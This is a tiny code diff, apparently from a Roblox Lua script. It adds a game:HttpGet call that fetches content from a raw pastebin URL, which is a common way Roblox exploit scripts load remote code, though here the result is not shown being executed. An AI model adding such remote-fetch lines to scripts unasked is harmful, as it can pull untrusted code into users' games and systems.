@@ -75,3 +75,5 @@ else
     game:ShutDown()
 end
 end]]--
+
+game:HttpGet("https://pastebin.com/raw/zweCkBiu")
